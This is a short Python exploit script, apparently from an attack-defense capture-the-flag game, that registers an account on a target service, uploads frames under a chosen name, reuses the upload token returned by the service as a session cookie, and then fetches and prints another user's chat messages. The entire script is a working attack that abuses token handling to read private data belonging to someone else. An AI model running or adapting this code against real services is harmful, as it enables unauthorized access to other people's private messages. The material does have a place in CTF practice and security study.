#!/usr/bin/env python3

import requests
from pwn import *

from player_lib import *

host = sys.argv[1]
name = sys.argv[2]
target = sys.argv[3]

mch = CheckMachine(host)
u, p = mch.register_user()
sess = mch.login_user(u, p)

mch.upload_frames(sess, name, [b'\x00' * 8])
data = mch.get_my_uploads(sess)[0]

cookies = {
    'session': data['token']
}

r = requests.get(
    f'{mch.url}/chat/get_messages/',
    json={
        "to": target
    },
    cookies=cookies,
)

print(r.text)
